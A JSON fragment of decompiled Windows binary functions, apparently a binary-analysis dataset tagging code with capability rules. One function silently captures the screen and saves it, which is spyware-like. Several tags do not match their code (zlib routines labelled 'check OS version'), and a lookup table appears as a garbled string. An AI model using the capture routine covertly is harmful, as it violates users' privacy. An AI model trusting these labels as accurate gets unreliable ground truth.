        "decompiled_code": "\nvoid __cdecl fcn.00421130(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_8h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_38h = arg_ch;\n    var_54h = 1;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    fcn.0042acb0(&var_54h, 0, 0x10);\n    arg_8h = 0;\n    var_54h = 1;\n    iVar1 = (**0x469264)(&var_3ch, &var_54h);\n    if ((iVar1 == 0) && (iVar1 = (**0x4691c4)(0, 1, &var_2ch),  iVar1 == 0)) {\n        uVar2 = (**0x4690b0)();\n        (**0x4692fc)(uVar2, &var_24h);\n        uVar3 = (**0x4692d8)(uVar2);\n        uVar4 = (**0x469188)(uVar3);\n        var_30h = (**0x4690f4)(uVar3, var_1ch, var_18h);\n        var_40h = (**0x4690d4)(uVar4, var_30h);\n        (**0x4690b4)(uVar4, 0, 0, var_1ch, var_18h, uVar3, 0, 0, 0xcc0020);\n        iVar1 = (**0x469224)(var_30h, 0, &var_28h);\n        if ((iVar1 == 0) &&\n           ((iVar1 = fcn.00421080(\"%DESKTOP%\", &var_14h),  iVar1 != -1 &&\n            (iVar1 = (**0x4691f8)(var_28h, var_2ch, &var_14h, 0),  iVar1 == 0)))) {\n            (**0x4690c0)(var_2ch, &var_34h);\n            var_44h = (**0x469104)(var_34h);\n            arg_14h = (**0x469098)(var_34h);\n            fcn.00429fe0(var_38h, 0x4480b4, var_44h, arg_14h);\n            (**0x4690d4)(uVar4, var_40h);\n            (**0x469138)(var_28h);\n            (**0x469244)(var_3ch);\n            (**0x469270)(var_30h);\n            (**0x469270)(uVar4);\n            (**0x46925c)(uVar2, uVar3);\n            (**0x4692cc)(uVar2);\n        }\n    }\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 809
    },
    "00421430": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421430(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    \n    uVar1 = **(in_ECX + 0x20);\n    if ((uVar1 != 0) && (**(in_ECX + 0x10) <= uVar1 && uVar1 != **(in_ECX + 0x10))) {\n        if ((arg_8h == -1) || ((arg_8h == *(uVar1 - 1) || ((*(in_ECX + 0x40) & 2) == 0)))) {\n            **(in_ECX + 0x30) = **(in_ECX + 0x30) + 1;\n            **(in_ECX + 0x20) = **(in_ECX + 0x20) + -1;\n            if (arg_8h != -1) {\n                ***(in_ECX + 0x20) = arg_8h;\n                return arg_8h;\n            }\n            return 0;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 254
    },
    "00427a40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00427a40(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *arg_10h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    ulong uVar4;\n    uint arg_8h_00;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    arg_10h = in_ECX + 0x70;\n    *(in_ECX + 0x7c) = 0;\n    *(in_ECX + 0x84) = 0;\n    *(in_ECX + 0x80) = 0;\n    *(in_ECX + 0x78) = 0;\n    *arg_10h = 0;\n    *(in_ECX + 0x90) = 0;\n    *(in_ECX + 0x74) = 0;\n    if ((arg_8h != 0) && (arg_8h != -1)) {\n        iVar1 = (**0x469108)(*(in_ECX + 4), 0, 0, 1);\n        if (iVar1 == -1) {\n            *(in_ECX + 0x4c) = 0x80000000;\n            *arg_10h = -1;\n            if (arg_ch != 0) {\n                *arg_10h = arg_ch;\n            }\n            *(in_ECX + 0x6c) = 0;\n            (**0x4691e0)(&var_14h);\n            (**0x4691fc)(&var_14h, &var_24h);\n            fcn.004273f0(var_24h, var_20h, &var_1ch, &var_18h);\n            arg_8h_00 = 0;\n            uVar4 = fcn.0042d920(var_24h + 0x2ac18000, (var_20h + -0x19db1de) - (var_24h < 0xd53e8000), 10000000);\n            uVar3 = uVar4 >> 0x20;\n            uVar2 = uVar4;\n            *(in_ECX + 0x5c) = uVar3;\n            *(in_ECX + 100) = uVar3;\n            *(in_ECX + 0x54) = uVar3;\n            *(in_ECX + 0x7c) = arg_8h;\n            *(in_ECX + 0x50) = uVar2;\n            *(in_ECX + 0x58) = uVar2;\n            *(in_ECX + 0x60) = uVar2;\n            *(in_ECX + 0x68) = CONCAT22(var_1ch, var_18h);\n            fcn.0042ad2a(arg_8h_00);\n            return;\n        }\n        iVar1 = fcn.00427470(arg_8h, in_ECX + 0x4c, arg_10h, in_ECX + 0x50, in_ECX + 0x68);\n        if (iVar1 == 0) {\n            (**0x469108)(arg_8h, 0, 0);\n            *(in_ECX + 0x7c) = arg_8h;\n            *(in_ECX + 0x6c) = 1;\n            fcn.0042ad2a(iVar1);\n            return;\n        }\n    }\n    fcn.0042ad2a(var_24h);\n    return;\n}\n",
        "token_count": 878
    },
    "00427f00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00427f00(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t arg_ch;\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    arg_8h = param_1 + 0x94;\n    var_4h = 0;\n    arg_ch = fcn.00427de0(arg_8h, 0x4000);\n    while ((arg_ch != 0 && (arg_ch != -1))) {\n        iVar1 = fcn.00427870(arg_8h, arg_ch);\n        if (iVar1 != arg_ch) {\n            return 0x60000;\n        }\n        var_4h = var_4h + arg_ch;\n        arg_ch = fcn.00427de0(arg_8h, 0x4000);\n    }\n    *(param_1 + 0x90) = var_4h;\n    return 0;\n}\n",
        "token_count": 214
    },
    "00428810": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00428810(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x7c) = 0;\n    *(in_ECX + 0x84) = 0;\n    *(in_ECX + 0x80) = 0;\n    *(in_ECX + 0x78) = 0;\n    *(in_ECX + 0x70) = 0;\n    *(in_ECX + 0x90) = 0;\n    *(in_ECX + 0x74) = 0;\n    if (arg_8h == 0) {\n        return 0x10000;\n    }\n    arg_8h_00 = (**0x4690ec)(arg_8h, 0x80000000, 1, 0, 3, 0, 0);\n    if (arg_8h_00 == -1) {\n        return 0x200;\n    }\n    iVar1 = fcn.00427a40(arg_8h_00, 0);\n    if (iVar1 != 0) {\n        (**0x4690f0)(arg_8h_00);\n        return iVar1;\n    }\n    *(in_ECX + 0x80) = 1;\n    return 0;\n}\n",
        "token_count": 316
    },
    "0042dbfe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042dbfe(uint arg_8h)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t **arg_8h_00;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00434110(0x44e648, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == NULL) {\n        puVar2 = fcn.0043064c();\n        *puVar2 = 0x16;\n        fcn.00431ed7();\n        goto code_r0x0042dce1;\n    }\n    fcn.0042e011(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar3 = fcn.00434666(arg_8h_00);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar4 = 0x457540;\n        }\n        else {\n            iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x46a340);\n        }\n        if ((*(iVar4 + 0x24) & 0x7f) == 0) {\n            if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n                iVar4 = 0x457540;\n            }\n            else {\n                iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x46a340);\n            }\n            if ((*(iVar4 + 0x24) & 0x80) == 0) goto code_r0x0042dcb4;\n        }\n        puVar2 = fcn.0043064c();\n        *puVar2 = 0x16;\n        fcn.00431ed7();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x0042dcb4:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar3 = fcn.004342ff(arg_8h_00);\n        }\n        else {\n            uVar3 = **arg_8h_00;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0042dcea();\ncode_r0x0042dce1:\n    fcn.00434155();\n    return;\n}\n",
        "token_count": 756
    },
    "0042dcf2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042dcf2(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t **arg_8h_00;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00434110(0x44e668, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    if (arg_8h_00 == NULL) {\n        puVar3 = fcn.0043064c();\n        *puVar3 = 0x16;\n        fcn.00431ed7();\n        goto code_r0x0042dddd;\n    }\n    fcn.0042e011(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar4 = fcn.00434666(arg_8h_00);\n        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n            iVar5 = 0x457540;\n        }\n        else {\n            iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x46a340);\n        }\n        if ((*(iVar5 + 0x24) & 0x7f) == 0) {\n            if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n                iVar5 = 0x457540;\n            }\n            else {\n                iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x46a340);\n            }\n            if ((*(iVar5 + 0x24) & 0x80) == 0) goto code_r0x0042dda8;\n        }\n        puVar3 = fcn.0043064c();\n        *puVar3 = 0x16;\n        fcn.00431ed7();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x0042dda8:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar4 = fcn.00431ee7(*(unaff_EBP + 8), arg_8h_00);\n        }\n        else {\n            uVar2 = *(unaff_EBP + 8);\n            **arg_8h_00 = uVar2;\n            uVar4 = uVar2;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0042dde6();\ncode_r0x0042dddd:\n    fcn.00434155();\n    return;\n}\n",
        "token_count": 797
    },
    "0040c070": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c070(uint *param_1)\n\n{\n    uint *puVar1;\n    uchar *arg_8h;\n    int32_t iVar2;\n    uint arg_ch;\n    int32_t **in_FS_OFFSET;\n    uint *var_8h;\n    uint32_t in_stack_00000018;\n    uint var_c14h;\n    uint var_c10h;\n    uint var_c0ch;\n    uint var_c08h;\n    uint var_c04h;\n    uint var_c00h;\n    uint var_bfch;\n    uint var_bf8h;\n    uint var_bf4h;\n    uint var_bd8h;\n    uint var_bd4h;\n    uint var_bcch;\n    uint var_bc8h;\n    uint var_7e0h;\n    uint var_3f8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint arg_ch_00;\n    uint *puVar3;\n    uint32_t noname_3;\n    uint noname_4;\n    uchar *arg_20h;\n    uint in_stack_fffff3e8;\n    uint var_bd4h_2;\n    uint var_bcch_2;\n    uint var_bc8h_2;\n    uchar auStack2020 [1000];\n    uint var_3f8h_2;\n    uchar uStack1016;\n    uchar uStack1015;\n    uint32_t uStack20;\n    int32_t *piStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack12 = 0x43dd18;\n    piStack16 = *in_FS_OFFSET;\n    uStack20 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &piStack16;\n    uStack8 = 0;\n    *0x4586ec = 1;\n    fcn.0042acb0();\n    var_bcch_2._0_2_ = 0x3b;\n    puVar1 = var_8h;\n    if (in_stack_00000018 < 0x10) {\n        puVar1 = &param_1;\n    }\n    arg_8h = fcn.0042d83d(puVar1, &var_bcch_2, &var_bd4h_2);\n    while (arg_8h != NULL) {\n        iVar2 = (**0x469150)();\n        if (5 < iVar2) {\n            fcn.0042acb0();\n            fcn.0042acb0(&var_bc8h_2);\n            iVar2 = (**0x469150)();\n            if (iVar2 < 0) {\n                var_3f8h_2._0_1_ = 0;\n            }\n            else {\n                var_3f8h_2._0_1_ = *arg_8h;\n                var_3f8h_2._1_1_ = arg_8h[1];\n                var_3f8h_2._2_1_ = arg_8h[2];\n                var_3f8h_2._3_1_ = arg_8h[3];\n                uStack1016 = arg_8h[4];\n                uStack1015 = 0;\n            }\n            arg_20h = arg_8h + 5;\n            puVar1 = &var_bc8h_2;\n            (**0x469304)();\n            noname_4 = 0x446f88;\n            puVar3 = &var_3f8h_2;\n            iVar2 = (**0x469288)();\n            if (iVar2 == 0) {\n                noname_3 = puVar3 & 0xffffff00;\n                arg_ch = fcn.0042b420(0x4453cc);\n                arg_ch_00 = 0x4453cc;\n                fcn.00406270(0x4453cc, arg_ch);\n                fcn.00414d10(&var_bc8h_2, arg_ch_00, arg_ch, noname_3, noname_4, puVar1, arg_20h);\n            }\n            else {\n                (**0x469258)();\n                fcn.00420ef0(0x14);\n                (**0x469258)();\n                (**0x469258)();\n                fcn.00414b40(arg_8h, auStack2020);\n                fcn.0042acb0(&stack0xfffff3e8, 0, 0x3c);\n                in_stack_fffff3e8 = 0x3c;\n                (**0x4692bc)(&stack0xfffff3e8);\n                fcn.0042acb0();\n            }\n            fcn.0042acb0();\n            fcn.0042acb0(&var_3f8h_2);\n            fcn.0042acb0(&var_bc8h_2, 0, 1000);\n            arg_8h = fcn.0042d83d(0, &var_bcch_2, &var_bd4h_2);\n        }\n    }\n    *0x4586f4 = 1;\n    if (0xf < in_stack_00000018) {\n        fcn.0042ac49();\n    }\n    *in_FS_OFFSET = piStack16;\n    fcn.0042ad2a(in_stack_fffff3e8);\n    return;\n}\n",
        "token_count": 1197
    },
    "0040ece0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040ece0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uchar auStackY125016 [4];\n    uint uStackY125012;\n    uchar auStackY125008 [50000];\n    uchar auStackY75008 [50000];\n    uchar auStackY25008 [20000];\n    uint var_138ch;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uchar *puStackY60;\n    uint uStackY56;\n    uint uStackY52;\n    uint *puStackY48;\n    uint uStackY44;\n    uint uStackY40;\n    uint var_4h;\n    \n    fcn.0042ae40();\n    uStackY125012 = 0;\n    fcn.0042acb0();\n    uStackY40 = 0x40ed35;\n    fcn.0042acb0();\n    uStackY40 = 5000;\n    puStackY48 = &fcn.0040ece0::var_138ch;\n    uStackY44 = 0;\n    uStackY52 = 0x40ed48;\n    fcn.0042acb0();\n    uStackY52 = 50000;\n    puStackY60 = &stack0xfffe17b0;\n    uStackY56 = 0;\n    uStackY64 = 0x40ed5b;\n    fcn.0042acb0();\n    uStackY64 = 15000;\n    puStackY72 = &stack0xffff9e50;\n    uStackY68 = 0;\n    uStackY76 = 0x40ed6e;\n    fcn.0042acb0();\n    (**0x469258)();\n    iVar1 = fcn.0042d83d(&stack0xfffedb00, 0x447134, &stack0xfffe17a8);\n    iVar2 = 1;\n    while (iVar1 != 0) {\n        switch(iVar2) {\n        case 1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        default:\n            iVar2 = iVar2 + 1;\n            uStackY40 = 0x40ef0c;\n            iVar1 = fcn.0042d83d(0, 0x447134, &stack0xfffe17a8);\n        }\n    }\n    fcn.0042acb0();\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 729
    },
    "00406fb0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00406fb0(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint8_t **arg_1ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uchar *puVar16;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint8_t *var_8h;\n    uint8_t *var_4h;\n    \n    var_4h = *arg_1ch;\n    var_8h = arg_1ch[1];\n    uVar15 = *(arg_18h + 0x20);\n    uVar6 = *(arg_18h + 0x1c);\n    puVar16 = *(arg_18h + 0x34);\n    if (puVar16 < *(arg_18h + 0x30)) {\n        var_ch = *(arg_18h + 0x30) + (-1 - puVar16);\n    }\n    else {\n        var_ch = *(arg_18h + 0x2c) - puVar16;\n    }\n    uVar12 = *(\"ZT6C73DEQBIB\" + arg_8h * 4);\n    uVar5 = *(\"ZT6C73DEQBIB\" + arg_ch * 4);\n    do {\n        for (; uVar6 < 0x14; uVar6 = uVar6 + 8) {\n            uVar3 = *var_4h;\n            var_8h = var_8h + -1;\n            var_4h = var_4h + 1;\n            uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n        }\n        uVar3 = *(arg_10h + (uVar12 & uVar15) * 8);\n        uVar14 = uVar3;\n        iVar13 = arg_10h + (uVar12 & uVar15) * 8;\n        uVar4 = *(iVar13 + 1);\n        uVar15 = uVar15 >> (uVar4 & 0x1f);\n        if (uVar14 == 0) {\ncode_r0x004071dc:\n            uVar6 = uVar6 - uVar4;\n            *puVar16 = *(iVar13 + 4);\n            puVar16 = puVar16 + 1;\n            var_ch = var_ch + -1;\n        }\n        else {\n            uVar6 = uVar6 - *(iVar13 + 1);\n            while ((uVar3 & 0x10) == 0) {\n                if ((uVar14 & 0x40) != 0) {\n                    if ((uVar14 & 0x20) != 0) {\n                        uVar12 = arg_1ch[1] - var_8h;\n                        if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                            uVar12 = uVar6 >> 3;\n                        }\n                        *(arg_18h + 0x20) = uVar15;\n                        *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n                        arg_1ch[1] = var_8h + uVar12;\n                        puVar1 = *arg_1ch;\n                        *arg_1ch = var_4h + -uVar12;\n                        arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n                        *(arg_18h + 0x34) = puVar16;\n                        return 1;\n                    }\n                    arg_1ch[6] = 0x446cf8;\n                    goto code_r0x004072a6;\n                }\n                iVar7 = (*(\"ZT6C73DEQBIB\" + uVar14 * 4) & uVar15) + *(iVar13 + 4);\n                uVar3 = *(iVar13 + iVar7 * 8);\n                uVar14 = uVar3;\n                iVar13 = iVar13 + iVar7 * 8;\n                uVar4 = *(iVar13 + 1);\n                uVar15 = uVar15 >> (uVar4 & 0x1f);\n                if (uVar14 == 0) goto code_r0x004071dc;\n                uVar6 = uVar6 - *(iVar13 + 1);\n            }\n            uVar14 = uVar14 & 0xf;\n            uVar8 = (*(\"ZT6C73DEQBIB\" + uVar14 * 4) & uVar15) + *(iVar13 + 4);\n            uVar15 = uVar15 >> uVar14;\n            for (uVar6 = uVar6 - uVar14; uVar6 < 0xf; uVar6 = uVar6 + 8) {\n                uVar3 = *var_4h;\n                var_8h = var_8h + -1;\n                var_4h = var_4h + 1;\n                uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n            }\n            puVar1 = arg_14h + (uVar5 & uVar15) * 8;\n            uVar15 = uVar15 >> (puVar1[1] & 0x1f);\n            uVar6 = uVar6 - puVar1[1];\n            uVar3 = *puVar1;\n            while ((uVar3 & 0x10) == 0) {\n                if ((uVar3 & 0x40) != 0) {\n                    arg_1ch[6] = 0x446d14;\ncode_r0x004072a6:\n                    uVar12 = arg_1ch[1] - var_8h;\n                    if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                        uVar12 = uVar6 >> 3;\n                    }\n                    *(arg_18h + 0x20) = uVar15;\n                    *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n                    arg_1ch[1] = var_8h + uVar12;\n                    puVar1 = *arg_1ch;\n                    *arg_1ch = var_4h + -uVar12;\n                    arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n                    *(arg_18h + 0x34) = puVar16;\n                    return 0xfffffffd;\n                }\n                iVar13 = (*(\"ZT6C73DEQBIB\" + uVar3 * 4) & uVar15) + *(puVar1 + 4);\n                puVar2 = puVar1 + iVar13 * 8 + 1;\n                puVar1 = puVar1 + iVar13 * 8;\n                uVar15 = uVar15 >> (*puVar2 & 0x1f);\n                uVar6 = uVar6 - *puVar2;\n                uVar3 = *puVar1;\n            }\n            uVar14 = uVar3 & 0xf;\n            for (; uVar6 < uVar14; uVar6 = uVar6 + 8) {\n                uVar3 = *var_4h;\n                var_8h = var_8h + -1;\n                var_4h = var_4h + 1;\n                uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n            }\n            uVar9 = *(\"ZT6C73DEQBIB\" + uVar14 * 4) & uVar15;\n            var_ch = var_ch + -uVar8;\n            uVar15 = uVar15 >> uVar14;\n            uVar6 = uVar6 - uVar14;\n            puVar11 = *(arg_18h + 0x28);\n            puVar10 = puVar16 + -(uVar9 + *(puVar1 + 4));\n            if (puVar10 < puVar11) {\n                do {\n                    puVar10 = puVar10 + (*(arg_18h + 0x2c) - puVar11);\n                } while (puVar10 < puVar11);\n                arg_8h = *(arg_18h + 0x2c) - puVar10;\n                if (arg_8h < uVar8) {\n                    iVar13 = uVar8 - arg_8h;\n                    do {\n                        *puVar16 = *puVar10;\n                        puVar16 = puVar16 + 1;\n                        puVar10 = puVar10 + 1;\n                        arg_8h = arg_8h - 1;\n                    } while (arg_8h != 0);\n                    puVar11 = *(arg_18h + 0x28);\n                    do {\n                        *puVar16 = *puVar11;\n                        puVar16 = puVar16 + 1;\n                        puVar11 = puVar11 + 1;\n                        iVar13 = iVar13 + -1;\n                    } while (iVar13 != 0);\n                }\n                else {\n                    *puVar16 = *puVar10;\n                    puVar16[1] = puVar10[1];\n                    puVar16 = puVar16 + 2;\n                    puVar10 = puVar10 + 2;\n                    iVar13 = uVar8 - 2;\n                    do {\n                        *puVar16 = *puVar10;\n                        puVar16 = puVar16 + 1;\n                        puVar10 = puVar10 + 1;\n                        iVar13 = iVar13 + -1;\n                    } while (iVar13 != 0);\n                }\n            }\n            else {\n                *puVar16 = *puVar10;\n                puVar16[1] = puVar10[1];\n                puVar16 = puVar16 + 2;\n                puVar10 = puVar10 + 2;\n                iVar13 = uVar8 - 2;\n                do {\n                    *puVar16 = *puVar10;\n                    puVar16 = puVar16 + 1;\n                    puVar10 = puVar10 + 1;\n                    iVar13 = iVar13 + -1;\n                } while (iVar13 != 0);\n            }\n        }\n        if ((var_ch < 0x102) || (var_8h < 0xa)) {\n            uVar12 = arg_1ch[1] - var_8h;\n            if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                uVar12 = uVar6 >> 3;\n            }\n            *(arg_18h + 0x20) = uVar15;\n            *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n            arg_1ch[1] = var_8h + uVar12;\n            puVar1 = *arg_1ch;\n            *arg_1ch = var_4h + -uVar12;\n            arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n            *(arg_18h + 0x34) = puVar16;\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 2655
    },
    "004260c0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004260c0(int32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = *(arg_ch + 2);\n    iVar4 = 0;\n    var_4h = 0xffffffff;\n    iVar3 = 7;\n    iVar7 = 4;\n    if (uVar2 == 0) {\n        iVar3 = 0x8a;\n        iVar7 = 3;\n    }\n    *(arg_ch + 6 + arg_10h * 4) = 0xffff;\n    if (-1 < arg_10h) {\n        arg_ch = arg_ch + 6;\n        arg_10h = arg_10h + 1;\n        uVar5 = uVar2;\n        do {\n            uVar6 = *arg_ch;\n            iVar4 = iVar4 + 1;\n            if ((iVar3 <= iVar4) || (uVar5 != uVar6)) {\n                if (iVar4 < iVar7) {\n                    piVar1 = arg_8h + 0xef4 + uVar5 * 4;\n                    *piVar1 = *piVar1 + iVar4;\n                }\n                else if (uVar5 == 0) {\n                    if (iVar4 < 0xb) {\n                        *(arg_8h + 0xf38) = *(arg_8h + 0xf38) + 1;\n                    }\n                    else {\n                        *(arg_8h + 0xf3c) = *(arg_8h + 0xf3c) + 1;\n                    }\n                }\n                else {\n                    if (uVar5 != var_4h) {\n                        piVar1 = arg_8h + 0xef4 + uVar5 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(arg_8h + 0xf34) = *(arg_8h + 0xf34) + 1;\n                }\n                iVar4 = 0;\n                var_4h = uVar5;\n                if (uVar6 == 0) {\n                    iVar3 = 0x8a;\n                    iVar7 = 3;\n                }\n                else if (uVar5 == uVar6) {\n                    iVar3 = 6;\n                    iVar7 = 3;\n                }\n                else {\n                    iVar3 = 7;\n                    iVar7 = 4;\n                }\n            }\n            arg_ch = arg_ch + 2;\n            arg_10h = arg_10h + -1;\n            uVar5 = uVar6;\n        } while (arg_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 656
    },
    "00428260": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
